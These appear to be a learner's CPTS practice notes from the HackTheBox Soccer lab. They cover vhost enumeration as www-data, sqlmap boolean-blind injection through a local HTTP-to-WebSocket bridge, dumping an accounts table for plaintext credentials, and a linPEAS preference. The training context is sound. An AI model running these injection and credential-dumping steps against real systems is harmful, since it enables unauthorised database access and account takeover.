# CPTS Running Notes (to sort + merge on push)

Scratch list captured during practice. Sort into the proper section files before/at push.

---

## Post-exploitation enumeration (www-data / web service account)

- **As `www-data`, always check the web server's vhost config** after the basics
  (LinEnum/linPEAS, `sudo -l` / `doas -l`, home dirs, `/var/www`, cron). The web
  server config frequently reveals **other vhosts** that aren't discoverable
  externally — a new internal vhost is often the next foothold or the path to a
  DB / admin panel.

  Correct paths (it is **not** `/etc/sites-available`):

  ```bash
  # nginx (e.g. HTB Soccer)
  ls -la /etc/nginx/sites-available/ /etc/nginx/sites-enabled/
  cat /etc/nginx/sites-available/*
  grep -riE 'server_name|proxy_pass|root|listen' /etc/nginx/

  # apache
  ls -la /etc/apache2/sites-available/ /etc/apache2/sites-enabled/
  cat /etc/apache2/sites-available/*
  grep -riE 'ServerName|ServerAlias|DocumentRoot|ProxyPass' /etc/apache2/
  ```

  Why it matters: a vhost in the config but not in public DNS (or not in your
  `/etc/hosts`) is the designer's intended pivot. Pull its `server_name`, add it
  to `/etc/hosts`, and enumerate it. (Soccer: this is how `soc-player.soccer.htb`
  surfaces post-foothold.)

---

## WebSocket SQL injection (sqlmap cannot hit ws:// directly)

- **Identify it's a WebSocket in Burp:** the request shows up under
  **Proxy → WebSockets history** (not the normal HTTP history), protocol `ws://`
  (e.g. `ws://soc-player.soccer.htb:9091/`). Messages are JSON like `{"id":"1"}`.

- **sqlmap does NOT accept `ws://` in `-u`.** The vuln is exploited over the
  socket, not HTTP, so `sqlmap -u 'ws://...'` fails. You need a **middleware
  bridge** that listens on local HTTP and forwards to the WebSocket, then point
  sqlmap at the local HTTP endpoint.

  ```bash
  # Option A: ready-made proxy
  git clone https://github.com/BKreisel/sqlmap-websocket-proxy
  # set the target ws:// in the script, run it → listens on http://localhost:8081/

  # Option B: small python bridge (set ws_server, listens http://localhost:8081/?id=*)
  #   ws_server = "ws://soc-player.soccer.htb:9091"
  ```

- **Then run sqlmap against the LOCAL http endpoint** (not the ws):

  ```bash
  sqlmap -u 'http://localhost:8081/?id=*' --batch \
         --technique B --level 5 --risk 3 --dbs
  ```

  - `*` marks the injection point (JSON `id` value).
  - `--technique B` = boolean-based blind (what Soccer's endpoint is).
  - Soccer result: MySQL backend, DB `soccer_db`.

- **Dump creds and move on:**

  ```bash
  sqlmap -u 'http://localhost:8081/?id=*' --batch -D soccer_db -T accounts --dump
  # -> plaintext creds for user 'player' -> SSH in
  ```

- Takeaway for the exam: when sqlmap "doesn't support" a transport (WebSocket,
  gRPC, odd encodings), the move is a **local HTTP shim/middleware**, then let
  sqlmap do its thing against localhost. Writing a tiny custom boolean-blind
  script is the fallback if no proxy fits.

---

## Tooling preference

- **Always use linPEAS over LinEnum when possible.** linPEAS is actively
  maintained, covers far more checks (doas.conf, writable paths, creds in files,
  CVE hints), and colour-codes likely wins. Reach for LinEnum only as a fallback
  when linPEAS won't run or gets flagged/blocked.
